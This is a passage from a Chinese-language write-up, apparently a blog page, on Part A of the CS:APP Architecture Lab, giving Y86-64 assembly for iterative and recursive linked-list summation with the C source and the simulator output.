</span><span id=__span-81-3><a id=__codelineno-81-3 name=__codelineno-81-3></a>sudo<span class=w> </span>apt<span class=w> </span>install<span class=w> </span>bison
</span></code></pre></div></td></tr></table></div> <p>至此编译可以成功运行得到汇编器yas等众多文件。</p> </li> <li> <h3 id=part-a>Part A<a class=headerlink href=#part-a title="Permanent link">¶</a></h3> <p>该部分主要是在文件夹<code>sim/misc</code>中，用Y86-64提供的指令集完成<code>example.c</code>中的函数编写，其中包含三个函数：<code>sum_list</code>、<code>rsum_list</code>和<code>copy_block</code>。可以使用汇编器yas对Y86-64程序进行汇编，然后使用指令集模拟器yis运行可执行文件。</p> <p>在<code>examples.c</code>中首先定义了一个链节点的结构体：</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-82-1>1</a></span>
<span class=normal><a href=#__codelineno-82-2>2</a></span>
<span class=normal><a href=#__codelineno-82-3>3</a></span>
<span class=normal><a href=#__codelineno-82-4>4</a></span>
<span class=normal><a href=#__codelineno-82-5>5</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-82-1><a id=__codelineno-82-1 name=__codelineno-82-1></a><span class=cm>/* linked list element */</span>
</span><span id=__span-82-2><a id=__codelineno-82-2 name=__codelineno-82-2></a><span class=k>typedef</span><span class=w> </span><span class=k>struct</span><span class=w> </span><span class=nc>ELE</span><span class=w> </span><span class=p>{</span>
</span><span id=__span-82-3><a id=__codelineno-82-3 name=__codelineno-82-3></a><span class=w>    </span><span class=kt>long</span><span class=w> </span><span class=n>val</span><span class=p>;</span>
</span><span id=__span-82-4><a id=__codelineno-82-4 name=__codelineno-82-4></a><span class=w>    </span><span class=k>struct</span><span class=w> </span><span class=nc>ELE</span><span class=w> </span><span class=o>*</span><span class=n>next</span><span class=p>;</span>
</span><span id=__span-82-5><a id=__codelineno-82-5 name=__codelineno-82-5></a><span class=p>}</span><span class=w> </span><span class=o>*</span><span class=n>list_ptr</span><span class=p>;</span>
</span></code></pre></div></td></tr></table></div> <h4 id=sum_list>sum_list<a class=headerlink href=#sum_list title="Permanent link">¶</a></h4> <p><code>sum_list</code>函数对应的C代码如下所示，是对链表ls元素进行累加:</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-83-1>1</a></span>
<span class=normal><a href=#__codelineno-83-2>2</a></span>
<span class=normal><a href=#__codelineno-83-3>3</a></span>
<span class=normal><a href=#__codelineno-83-4>4</a></span>
<span class=normal><a href=#__codelineno-83-5>5</a></span>
<span class=normal><a href=#__codelineno-83-6>6</a></span>
<span class=normal><a href=#__codelineno-83-7>7</a></span>
<span class=normal><a href=#__codelineno-83-8>8</a></span>
<span class=normal><a href=#__codelineno-83-9>9</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-83-1><a id=__codelineno-83-1 name=__codelineno-83-1></a><span class=kt>long</span><span class=w> </span><span class=nf>sum_list</span><span class=p>(</span><span class=n>list_ptr</span><span class=w> </span><span class=n>ls</span><span class=p>)</span>
</span><span id=__span-83-2><a id=__codelineno-83-2 name=__codelineno-83-2></a><span class=p>{</span>
</span><span id=__span-83-3><a id=__codelineno-83-3 name=__codelineno-83-3></a><span class=w>    </span><span class=kt>long</span><span class=w> </span><span class=n>val</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span>
</span><span id=__span-83-4><a id=__codelineno-83-4 name=__codelineno-83-4></a><span class=w>    </span><span class=k>while</span><span class=w> </span><span class=p>(</span><span class=n>ls</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
</span><span id=__span-83-5><a id=__codelineno-83-5 name=__codelineno-83-5></a><span class=w>        </span><span class=n>val</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=n>ls</span><span class=o>-&gt;</span><span class=n>val</span><span class=p>;</span>
</span><span id=__span-83-6><a id=__codelineno-83-6 name=__codelineno-83-6></a><span class=w>        </span><span class=n>ls</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>ls</span><span class=o>-&gt;</span><span class=n>next</span><span class=p>;</span>
</span><span id=__span-83-7><a id=__codelineno-83-7 name=__codelineno-83-7></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-83-8><a id=__codelineno-83-8 name=__codelineno-83-8></a><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=n>val</span><span class=p>;</span>
</span><span id=__span-83-9><a id=__codelineno-83-9 name=__codelineno-83-9></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> <p>我们需要写一个Y86-64汇编程序对以下链表结构调用<code>sum_list</code>函数：(链表是保存在内存中的，并且根据结构体ELE的声明，一个ELE实例在内存中的分布是8字节的val值以及8字节的ELE *值。)</p> <div class="language-text highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-84-1> 1</a></span>
<span class=normal><a href=#__codelineno-84-2> 2</a></span>
<span class=normal><a href=#__codelineno-84-3> 3</a></span>
<span class=normal><a href=#__codelineno-84-4> 4</a></span>
<span class=normal><a href=#__codelineno-84-5> 5</a></span>
<span class=normal><a href=#__codelineno-84-6> 6</a></span>
<span class=normal><a href=#__codelineno-84-7> 7</a></span>
<span class=normal><a href=#__codelineno-84-8> 8</a></span>
<span class=normal><a href=#__codelineno-84-9> 9</a></span>
<span class=normal><a href=#__codelineno-84-10>10</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-84-1><a id=__codelineno-84-1 name=__codelineno-84-1></a>    .align 8
</span><span id=__span-84-2><a id=__codelineno-84-2 name=__codelineno-84-2></a>ele1:
</span><span id=__span-84-3><a id=__codelineno-84-3 name=__codelineno-84-3></a>    .quad 0x00a
</span><span id=__span-84-4><a id=__codelineno-84-4 name=__codelineno-84-4></a>    .quad ele2
</span><span id=__span-84-5><a id=__codelineno-84-5 name=__codelineno-84-5></a>ele2:
</span><span id=__span-84-6><a id=__codelineno-84-6 name=__codelineno-84-6></a>    .quad 0x0b0
</span><span id=__span-84-7><a id=__codelineno-84-7 name=__codelineno-84-7></a>    .quad ele3
</span><span id=__span-84-8><a id=__codelineno-84-8 name=__codelineno-84-8></a>ele3:
</span><span id=__span-84-9><a id=__codelineno-84-9 name=__codelineno-84-9></a>    .quad 0xc00
</span><span id=__span-84-10><a id=__codelineno-84-10 name=__codelineno-84-10></a>    .quad 0 
</span></code></pre></div></td></tr></table></div> <p>在<code>sim/misc</code>文件夹中，新建 <code>sum.ys</code>，然后填入以下内容:</p> <div class="language-asm highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-85-1> 1</a></span>
<span class=normal><a href=#__codelineno-85-2> 2</a></span>
<span class=normal><a href=#__codelineno-85-3> 3</a></span>
<span class=normal><a href=#__codelineno-85-4> 4</a></span>
<span class=normal><a href=#__codelineno-85-5> 5</a></span>
<span class=normal><a href=#__codelineno-85-6> 6</a></span>
<span class=normal><a href=#__codelineno-85-7> 7</a></span>
<span class=normal><a href=#__codelineno-85-8> 8</a></span>
<span class=normal><a href=#__codelineno-85-9> 9</a></span>
<span class=normal><a href=#__codelineno-85-10>10</a></span>
<span class=normal><a href=#__codelineno-85-11>11</a></span>
<span class=normal><a href=#__codelineno-85-12>12</a></span>
<span class=normal><a href=#__codelineno-85-13>13</a></span>
<span class=normal><a href=#__codelineno-85-14>14</a></span>
<span class=normal><a href=#__codelineno-85-15>15</a></span>
<span class=normal><a href=#__codelineno-85-16>16</a></span>
<span class=normal><a href=#__codelineno-85-17>17</a></span>
<span class=normal><a href=#__codelineno-85-18>18</a></span>
<span class=normal><a href=#__codelineno-85-19>19</a></span>
<span class=normal><a href=#__codelineno-85-20>20</a></span>
<span class=normal><a href=#__codelineno-85-21>21</a></span>
<span class=normal><a href=#__codelineno-85-22>22</a></span>
<span class=normal><a href=#__codelineno-85-23>23</a></span>
<span class=normal><a href=#__codelineno-85-24>24</a></span>
<span class=normal><a href=#__codelineno-85-25>25</a></span>
<span class=normal><a href=#__codelineno-85-26>26</a></span>
<span class=normal><a href=#__codelineno-85-27>27</a></span>
<span class=normal><a href=#__codelineno-85-28>28</a></span>
<span class=normal><a href=#__codelineno-85-29>29</a></span>
<span class=normal><a href=#__codelineno-85-30>30</a></span>
<span class=normal><a href=#__codelineno-85-31>31</a></span>
<span class=normal><a href=#__codelineno-85-32>32</a></span>
<span class=normal><a href=#__codelineno-85-33>33</a></span>
<span class=normal><a href=#__codelineno-85-34>34</a></span>
<span class=normal><a href=#__codelineno-85-35>35</a></span>
<span class=normal><a href=#__codelineno-85-36>36</a></span>
<span class=normal><a href=#__codelineno-85-37>37</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-85-1><a id=__codelineno-85-1 name=__codelineno-85-1></a><span class=w>    </span><span class=na>.pos</span><span class=w> </span><span class=mi>0</span><span class=w>                  </span><span class=c1># Execution begins at address 0</span>
</span><span id=__span-85-2><a id=__codelineno-85-2 name=__codelineno-85-2></a><span class=w>    </span><span class=nf>irmovq</span><span class=w> </span><span class=no>stack</span><span class=p>,</span><span class=w> </span><span class=nv>%rsp</span><span class=w>      </span><span class=c1># Set up stack pointer</span>
</span><span id=__span-85-3><a id=__codelineno-85-3 name=__codelineno-85-3></a><span class=w>    </span><span class=nf>call</span><span class=w> </span><span class=no>main</span><span class=w>               </span><span class=c1># Execute main program</span>
</span><span id=__span-85-4><a id=__codelineno-85-4 name=__codelineno-85-4></a><span class=w>    </span><span class=nf>halt</span><span class=w>                    </span><span class=c1># Terminate program</span>
</span><span id=__span-85-5><a id=__codelineno-85-5 name=__codelineno-85-5></a>
</span><span id=__span-85-6><a id=__codelineno-85-6 name=__codelineno-85-6></a><span class=w>    </span><span class=na>.align</span><span class=w> </span><span class=mi>8</span><span class=w>                </span><span class=c1># Sample linked list, aligned to 8-byte boundary</span>
</span><span id=__span-85-7><a id=__codelineno-85-7 name=__codelineno-85-7></a><span class=nl>ele1:</span>
</span><span id=__span-85-8><a id=__codelineno-85-8 name=__codelineno-85-8></a><span class=w>    </span><span class=na>.quad</span><span class=w> </span><span class=mi>0x00a</span>
</span><span id=__span-85-9><a id=__codelineno-85-9 name=__codelineno-85-9></a><span class=w>    </span><span class=na>.quad</span><span class=w> </span><span class=no>ele2</span>
</span><span id=__span-85-10><a id=__codelineno-85-10 name=__codelineno-85-10></a><span class=nl>ele2:</span>
</span><span id=__span-85-11><a id=__codelineno-85-11 name=__codelineno-85-11></a><span class=w>    </span><span class=na>.quad</span><span class=w> </span><span class=mi>0x0b0</span>
</span><span id=__span-85-12><a id=__codelineno-85-12 name=__codelineno-85-12></a><span class=w>    </span><span class=na>.quad</span><span class=w> </span><span class=no>ele3</span>
</span><span id=__span-85-13><a id=__codelineno-85-13 name=__codelineno-85-13></a><span class=nl>ele3:</span>
</span><span id=__span-85-14><a id=__codelineno-85-14 name=__codelineno-85-14></a><span class=w>    </span><span class=na>.quad</span><span class=w> </span><span class=mi>0xc00</span>
</span><span id=__span-85-15><a id=__codelineno-85-15 name=__codelineno-85-15></a><span class=w>    </span><span class=na>.quad</span><span class=w> </span><span class=mi>0</span>
</span><span id=__span-85-16><a id=__codelineno-85-16 name=__codelineno-85-16></a>
</span><span id=__span-85-17><a id=__codelineno-85-17 name=__codelineno-85-17></a><span class=nl>main:</span>
</span><span id=__span-85-18><a id=__codelineno-85-18 name=__codelineno-85-18></a><span class=w>    </span><span class=nf>irmovq</span><span class=w> </span><span class=no>ele1</span><span class=p>,</span><span class=nv>%rdi</span><span class=w>        </span><span class=c1># first element address as argument</span>
</span><span id=__span-85-19><a id=__codelineno-85-19 name=__codelineno-85-19></a><span class=w>    </span><span class=nf>call</span><span class=w> </span><span class=no>sum_list</span>
</span><span id=__span-85-20><a id=__codelineno-85-20 name=__codelineno-85-20></a><span class=w>    </span><span class=nf>ret</span>
</span><span id=__span-85-21><a id=__codelineno-85-21 name=__codelineno-85-21></a>
</span><span id=__span-85-22><a id=__codelineno-85-22 name=__codelineno-85-22></a><span class=nl>sum_list:</span><span class=w>                   </span><span class=c1># long sum_list(list_ptr ls), start in %rdi</span>
</span><span id=__span-85-23><a id=__codelineno-85-23 name=__codelineno-85-23></a><span class=w>    </span><span class=nf>irmovq</span><span class=w> </span><span class=no>$0</span><span class=p>,</span><span class=w> </span><span class=nv>%rax</span>
</span><span id=__span-85-24><a id=__codelineno-85-24 name=__codelineno-85-24></a><span class=w>    </span><span class=nf>jmp</span><span class=w> </span><span class=no>test</span>
</span><span id=__span-85-25><a id=__codelineno-85-25 name=__codelineno-85-25></a>
</span><span id=__span-85-26><a id=__codelineno-85-26 name=__codelineno-85-26></a><span class=nl>loop:</span>
</span><span id=__span-85-27><a id=__codelineno-85-27 name=__codelineno-85-27></a><span class=w>    </span><span class=nf>mrmovq</span><span class=w> </span><span class=p>(</span><span class=nv>%rdi</span><span class=p>),</span><span class=w> </span><span class=nv>%rsi</span><span class=w>     </span><span class=c1># Load current element value</span>
</span><span id=__span-85-28><a id=__codelineno-85-28 name=__codelineno-85-28></a><span class=w>    </span><span class=nf>addq</span><span class=w> </span><span class=nv>%rsi</span><span class=p>,</span><span class=w> </span><span class=nv>%rax</span><span class=w>         </span><span class=c1># Add to sum</span>
</span><span id=__span-85-29><a id=__codelineno-85-29 name=__codelineno-85-29></a><span class=w>    </span><span class=nf>mrmovq</span><span class=w> </span><span class=mi>8</span><span class=p>(</span><span class=nv>%rdi</span><span class=p>),</span><span class=w> </span><span class=nv>%rdi</span><span class=w>    </span><span class=c1># Load next element address</span>
</span><span id=__span-85-30><a id=__codelineno-85-30 name=__codelineno-85-30></a>
</span><span id=__span-85-31><a id=__codelineno-85-31 name=__codelineno-85-31></a><span class=nl>test:</span>
</span><span id=__span-85-32><a id=__codelineno-85-32 name=__codelineno-85-32></a><span class=w>    </span><span class=nf>andq</span><span class=w> </span><span class=nv>%rdi</span><span class=p>,</span><span class=w> </span><span class=nv>%rdi</span><span class=w>         </span><span class=c1># Check if ls == NULL</span>
</span><span id=__span-85-33><a id=__codelineno-85-33 name=__codelineno-85-33></a><span class=w>    </span><span class=nf>jne</span><span class=w> </span><span class=no>loop</span><span class=w>                </span><span class=c1># If not, enter loop</span>
</span><span id=__span-85-34><a id=__codelineno-85-34 name=__codelineno-85-34></a><span class=w>    </span><span class=nf>ret</span>
</span><span id=__span-85-35><a id=__codelineno-85-35 name=__codelineno-85-35></a>
</span><span id=__span-85-36><a id=__codelineno-85-36 name=__codelineno-85-36></a><span class=w>    </span><span class=na>.pos</span><span class=w> </span><span class=mi>0x200</span><span class=w>              </span><span class=c1># Stack starts here and grows to lower addresses</span>
</span><span id=__span-85-37><a id=__codelineno-85-37 name=__codelineno-85-37></a><span class=nl>stack:</span>
</span></code></pre></div></td></tr></table></div> <p>注意最后要多留一行空白行作为文件结尾，然后汇编并运行:</p> <div class="language-bash highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-86-1> 1</a></span>
<span class=normal><a href=#__codelineno-86-2> 2</a></span>
<span class=normal><a href=#__codelineno-86-3> 3</a></span>
<span class=normal><a href=#__codelineno-86-4> 4</a></span>
<span class=normal><a href=#__codelineno-86-5> 5</a></span>
<span class=normal><a href=#__codelineno-86-6> 6</a></span>
<span class=normal><a href=#__codelineno-86-7> 7</a></span>
<span class=normal><a href=#__codelineno-86-8> 8</a></span>
<span class=normal><a href=#__codelineno-86-9> 9</a></span>
<span class=normal><a href=#__codelineno-86-10>10</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-86-1><a id=__codelineno-86-1 name=__codelineno-86-1></a>sim/misc$<span class=w> </span>./yas<span class=w> </span>sum.ys<span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span>./yis<span class=w> </span>sum.yo
</span><span id=__span-86-2><a id=__codelineno-86-2 name=__codelineno-86-2></a>Stopped<span class=w> </span><span class=k>in</span><span class=w> </span><span class=m>26</span><span class=w> </span>steps<span class=w> </span>at<span class=w> </span><span class=nv>PC</span><span class=w> </span><span class=o>=</span><span class=w> </span>0x13.<span class=w>  </span>Status<span class=w> </span><span class=s1>'HLT'</span>,<span class=w> </span>CC<span class=w> </span><span class=nv>Z</span><span class=o>=</span><span class=m>1</span><span class=w> </span><span class=nv>S</span><span class=o>=</span><span class=m>0</span><span class=w> </span><span class=nv>O</span><span class=o>=</span><span class=m>0</span>
</span><span id=__span-86-3><a id=__codelineno-86-3 name=__codelineno-86-3></a>Changes<span class=w> </span>to<span class=w> </span>registers:
</span><span id=__span-86-4><a id=__codelineno-86-4 name=__codelineno-86-4></a>%rax:<span class=w>   </span>0x0000000000000000<span class=w>      </span>0x0000000000000cba
</span><span id=__span-86-5><a id=__codelineno-86-5 name=__codelineno-86-5></a>%rsp:<span class=w>   </span>0x0000000000000000<span class=w>      </span>0x0000000000000200
</span><span id=__span-86-6><a id=__codelineno-86-6 name=__codelineno-86-6></a>%rsi:<span class=w>   </span>0x0000000000000000<span class=w>      </span>0x0000000000000c00
</span><span id=__span-86-7><a id=__codelineno-86-7 name=__codelineno-86-7></a>
</span><span id=__span-86-8><a id=__codelineno-86-8 name=__codelineno-86-8></a>Changes<span class=w> </span>to<span class=w> </span>memory:
</span><span id=__span-86-9><a id=__codelineno-86-9 name=__codelineno-86-9></a>0x01f0:<span class=w> </span>0x0000000000000000<span class=w>      </span>0x000000000000005b
</span><span id=__span-86-10><a id=__codelineno-86-10 name=__codelineno-86-10></a>0x01f8:<span class=w> </span>0x0000000000000000<span class=w>      </span>0x0000000000000013
</span></code></pre></div></td></tr></table></div> <p>返回值<code>%rax = 0xcba = 0x00a + 0x0b0 + 0xc00</code>，结果正确。</p> <h4 id=rsum_list>rsum_list<a class=headerlink href=#rsum_list title="Permanent link">¶</a></h4> <p><code>rsum_list</code>函数对应的C代码如下所示，是通过递归形式完成链表累加:</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-87-1> 1</a></span>
<span class=normal><a href=#__codelineno-87-2> 2</a></span>
<span class=normal><a href=#__codelineno-87-3> 3</a></span>
<span class=normal><a href=#__codelineno-87-4> 4</a></span>
<span class=normal><a href=#__codelineno-87-5> 5</a></span>
<span class=normal><a href=#__codelineno-87-6> 6</a></span>
<span class=normal><a href=#__codelineno-87-7> 7</a></span>
<span class=normal><a href=#__codelineno-87-8> 8</a></span>
<span class=normal><a href=#__codelineno-87-9> 9</a></span>
<span class=normal><a href=#__codelineno-87-10>10</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-87-1><a id=__codelineno-87-1 name=__codelineno-87-1></a><span class=kt>long</span><span class=w> </span><span class=nf>rsum_list</span><span class=p>(</span><span class=n>list_ptr</span><span class=w> </span><span class=n>ls</span><span class=p>)</span>
</span><span id=__span-87-2><a id=__codelineno-87-2 name=__codelineno-87-2></a><span class=p>{</span>
</span><span id=__span-87-3><a id=__codelineno-87-3 name=__codelineno-87-3></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=o>!</span><span class=n>ls</span><span class=p>)</span>
</span><span id=__span-87-4><a id=__codelineno-87-4 name=__codelineno-87-4></a><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=mi>0</span><span class=p>;</span>
</span><span id=__span-87-5><a id=__codelineno-87-5 name=__codelineno-87-5></a><span class=w>    </span><span class=k>else</span><span class=w> </span><span class=p>{</span>
</span><span id=__span-87-6><a id=__codelineno-87-6 name=__codelineno-87-6></a><span class=w>        </span><span class=kt>long</span><span class=w> </span><span class=n>val</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>ls</span><span class=o>-&gt;</span><span class=n>val</span><span class=p>;</span>
</span><span id=__span-87-7><a id=__codelineno-87-7 name=__codelineno-87-7></a><span class=w>        </span><span class=kt>long</span><span class=w> </span><span class=n>rest</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>rsum_list</span><span class=p>(</span><span class=n>ls</span><span class=o>-&gt;</span><span class=n>next</span><span class=p>);</span>
</span><span id=__span-87-8><a id=__codelineno-87-8 name=__codelineno-87-8></a><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>val</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>rest</span><span class=p>;</span>
</span><span id=__span-87-9><a id=__codelineno-87-9 name=__codelineno-87-9></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-87-10><a id=__codelineno-87-10 name=__codelineno-87-10></a><span class=p>}</span><span class=w> </span>
</span></code></pre></div></td></tr></table></div> <p>和上一节一样，我们创建一个<code>rsum.ys</code>文件，写入以下代码:</p> <div class="language-asm highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-88-1> 1</a></span>
<span class=normal><a href=#__codelineno-88-2> 2</a></span>
<span class=normal><a href=#__codelineno-88-3> 3</a></span>
<span class=normal><a href=#__codelineno-88-4> 4</a></span>
<span class=normal><a href=#__codelineno-88-5> 5</a></span>
<span class=normal><a href=#__codelineno-88-6> 6</a></span>
<span class=normal><a href=#__codelineno-88-7> 7</a></span>
<span class=normal><a href=#__codelineno-88-8> 8</a></span>
<span class=normal><a href=#__codelineno-88-9> 9</a></span>
<span class=normal><a href=#__codelineno-88-10>10</a></span>
<span class=normal><a href=#__codelineno-88-11>11</a></span>
<span class=normal><a href=#__codelineno-88-12>12</a></span>
<span class=normal><a href=#__codelineno-88-13>13</a></span>
<span class=normal><a href=#__codelineno-88-14>14</a></span>
<span class=normal><a href=#__codelineno-88-15>15</a></span>
<span class=normal><a href=#__codelineno-88-16>16</a></span>
<span class=normal><a href=#__codelineno-88-17>17</a></span>
<span class=normal><a href=#__codelineno-88-18>18</a></span>
<span class=normal><a href=#__codelineno-88-19>19</a></span>
<span class=normal><a href=#__codelineno-88-20>20</a></span>
<span class=normal><a href=#__codelineno-88-21>21</a></span>
<span class=normal><a href=#__codelineno-88-22>22</a></span>
<span class=normal><a href=#__codelineno-88-23>23</a></span>
<span class=normal><a href=#__codelineno-88-24>24</a></span>
<span class=normal><a href=#__codelineno-88-25>25</a></span>
<span class=normal><a href=#__codelineno-88-26>26</a></span>
<span class=normal><a href=#__codelineno-88-27>27</a></span>
<span class=normal><a href=#__codelineno-88-28>28</a></span>
<span class=normal><a href=#__codelineno-88-29>29</a></span>
<span class=normal><a href=#__codelineno-88-30>30</a></span>
<span class=normal><a href=#__codelineno-88-31>31</a></span>
<span class=normal><a href=#__codelineno-88-32>32</a></span>
<span class=normal><a href=#__codelineno-88-33>33</a></span>
<span class=normal><a href=#__codelineno-88-34>34</a></span>
<span class=normal><a href=#__codelineno-88-35>35</a></span>
<span class=normal><a href=#__codelineno-88-36>36</a></span>
<span class=normal><a href=#__codelineno-88-37>37</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-88-1><a id=__codelineno-88-1 name=__codelineno-88-1></a><span class=w>    </span><span class=na>.pos</span><span class=w> </span><span class=mi>0</span><span class=w>                  </span><span class=c1># Execution begins at address 0</span>
</span><span id=__span-88-2><a id=__codelineno-88-2 name=__codelineno-88-2></a><span class=w>    </span><span class=nf>irmovq</span><span class=w> </span><span class=no>stack</span><span class=p>,</span><span class=w> </span><span class=nv>%rsp</span><span class=w>      </span><span class=c1># Set up stack pointer</span>
</span><span id=__span-88-3><a id=__codelineno-88-3 name=__codelineno-88-3></a><span class=w>    </span><span class=nf>call</span><span class=w> </span><span class=no>main</span><span class=w>               </span><span class=c1># Execute main program</span>
</span><span id=__span-88-4><a id=__codelineno-88-4 name=__codelineno-88-4></a><span class=w>    </span><span class=nf>halt</span><span class=w>                    </span><span class=c1># Terminate program</span>
</span><span id=__span-88-5><a id=__codelineno-88-5 name=__codelineno-88-5></a>
</span><span id=__span-88-6><a id=__codelineno-88-6 name=__codelineno-88-6></a><span class=w>    </span><span class=na>.align</span><span class=w> </span><span class=mi>8</span><span class=w>                </span><span class=c1># Sample linked list</span>
</span><span id=__span-88-7><a id=__codelineno-88-7 name=__codelineno-88-7></a><span class=nl>ele1:</span>
</span><span id=__span-88-8><a id=__codelineno-88-8 name=__codelineno-88-8></a><span class=w>    </span><span class=na>.quad</span><span class=w> </span><span class=mi>0x00a</span>
</span><span id=__span-88-9><a id=__codelineno-88-9 name=__codelineno-88-9></a><span class=w>    </span><span class=na>.quad</span><span class=w> </span><span class=no>ele2</span>
</span><span id=__span-88-10><a id=__codelineno-88-10 name=__codelineno-88-10></a><span class=nl>ele2:</span>
</span><span id=__span-88-11><a id=__codelineno-88-11 name=__codelineno-88-11></a><span class=w>    </span><span class=na>.quad</span><span class=w> </span><span class=mi>0x0b0</span>
</span><span id=__span-88-12><a id=__codelineno-88-12 name=__codelineno-88-12></a><span class=w>    </span><span class=na>.quad</span><span class=w> </span><span class=no>ele3</span>
</span><span id=__span-88-13><a id=__codelineno-88-13 name=__codelineno-88-13></a><span class=nl>ele3:</span>
</span><span id=__span-88-14><a id=__codelineno-88-14 name=__codelineno-88-14></a><span class=w>    </span><span class=na>.quad</span><span class=w> </span><span class=mi>0xc00</span>
</span><span id=__span-88-15><a id=__codelineno-88-15 name=__codelineno-88-15></a><span class=w>    </span><span class=na>.quad</span><span class=w> </span><span class=mi>0</span>
</span><span id=__span-88-16><a id=__codelineno-88-16 name=__codelineno-88-16></a>
</span><span id=__span-88-17><a id=__codelineno-88-17 name=__codelineno-88-17></a><span class=nl>main:</span>
</span><span id=__span-88-18><a id=__codelineno-88-18 name=__codelineno-88-18></a><span class=w>    </span><span class=nf>irmovq</span><span class=w> </span><span class=no>ele1</span><span class=p>,</span><span class=nv>%rdi</span>
</span><span id=__span-88-19><a id=__codelineno-88-19 name=__codelineno-88-19></a><span class=w>    </span><span class=nf>call</span><span class=w> </span><span class=no>rsum_list</span>
</span><span id=__span-88-20><a id=__codelineno-88-20 name=__codelineno-88-20></a><span class=w>    </span><span class=nf>ret</span>
</span><span id=__span-88-21><a id=__codelineno-88-21 name=__codelineno-88-21></a>
</span><span id=__span-88-22><a id=__codelineno-88-22 name=__codelineno-88-22></a><span class=nl>rsum_list:</span>
</span><span id=__span-88-23><a id=__codelineno-88-23 name=__codelineno-88-23></a><span class=w>    </span><span class=nf>andq</span><span class=w> </span><span class=nv>%rdi</span><span class=p>,</span><span class=w> </span><span class=nv>%rdi</span>
</span><span id=__span-88-24><a id=__codelineno-88-24 name=__codelineno-88-24></a><span class=w>    </span><span class=nf>je</span><span class=w> </span><span class=no>return</span><span class=w>               </span><span class=c1># if (!ls)</span>
</span><span id=__span-88-25><a id=__codelineno-88-25 name=__codelineno-88-25></a><span class=w>    </span><span class=nf>mrmovq</span><span class=w> </span><span class=p>(</span><span class=nv>%rdi</span><span class=p>),</span><span class=w> </span><span class=nv>%rbx</span><span class=w>     </span><span class=c1># val = ls-&gt;val</span>
</span><span id=__span-88-26><a id=__codelineno-88-26 name=__codelineno-88-26></a><span class=w>    </span><span class=nf>mrmovq</span><span class=w> </span><span class=mi>8</span><span class=p>(</span><span class=nv>%rdi</span><span class=p>),</span><span class=w> </span><span class=nv>%rdi</span><span class=w>    </span><span class=c1># ls = ls-&gt;next</span>
</span><span id=__span-88-27><a id=__codelineno-88-27 name=__codelineno-88-27></a><span class=w>    </span><span class=nf>pushq</span><span class=w> </span><span class=nv>%rbx</span>
</span><span id=__span-88-28><a id=__codelineno-88-28 name=__codelineno-88-28></a><span class=w>    </span><span class=nf>call</span><span class=w> </span><span class=no>rsum_list</span><span class=w>          </span><span class=c1># rsum_list(ls-&gt;next)</span>
</span><span id=__span-88-29><a id=__codelineno-88-29 name=__codelineno-88-29></a><span class=w>    </span><span class=nf>popq</span><span class=w> </span><span class=nv>%rbx</span>
</span><span id=__span-88-30><a id=__codelineno-88-30 name=__codelineno-88-30></a><span class=w>    </span><span class=nf>addq</span><span class=w> </span><span class=nv>%rbx</span><span class=p>,</span><span class=w> </span><span class=nv>%rax</span><span class=w>         </span><span class=c1># val + rest</span>
</span><span id=__span-88-31><a id=__codelineno-88-31 name=__codelineno-88-31></a><span class=w>    </span><span class=nf>ret</span>
</span><span id=__span-88-32><a id=__codelineno-88-32 name=__codelineno-88-32></a><span class=nl>return:</span>
</span><span id=__span-88-33><a id=__codelineno-88-33 name=__codelineno-88-33></a><span class=w>    </span><span class=nf>irmovq</span><span class=w> </span><span class=no>$0</span><span class=p>,</span><span class=w> </span><span class=nv>%rax</span>
</span><span id=__span-88-34><a id=__codelineno-88-34 name=__codelineno-88-34></a><span class=w>    </span><span class=nf>ret</span>
</span><span id=__span-88-35><a id=__codelineno-88-35 name=__codelineno-88-35></a>
</span><span id=__span-88-36><a id=__codelineno-88-36 name=__codelineno-88-36></a><span class=w>    </span><span class=na>.pos</span><span class=w> </span><span class=mi>0x200</span><span class=w>              </span><span class=c1># Stack starts here and grows to lower addresses</span>
</span><span id=__span-88-37><a id=__codelineno-88-37 name=__codelineno-88-37></a><span class=nl>stack:</span>
</span></code></pre></div></td></tr></table></div> <p>结果为<code>%rax = 0xcba = 0x00a + 0x0b0 + 0xc00</code>，与上一节的结果相同。</p> <div class="language-bash highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-89-1> 1</a></span>
<span class=normal><a href=#__codelineno-89-2> 2</a></span>
<span class=normal><a href=#__codelineno-89-3> 3</a></span>
<span class=normal><a href=#__codelineno-89-4> 4</a></span>
<span class=normal><a href=#__codelineno-89-5> 5</a></span>
<span class=normal><a href=#__codelineno-89-6> 6</a></span>
<span class=normal><a href=#__codelineno-89-7> 7</a></span>
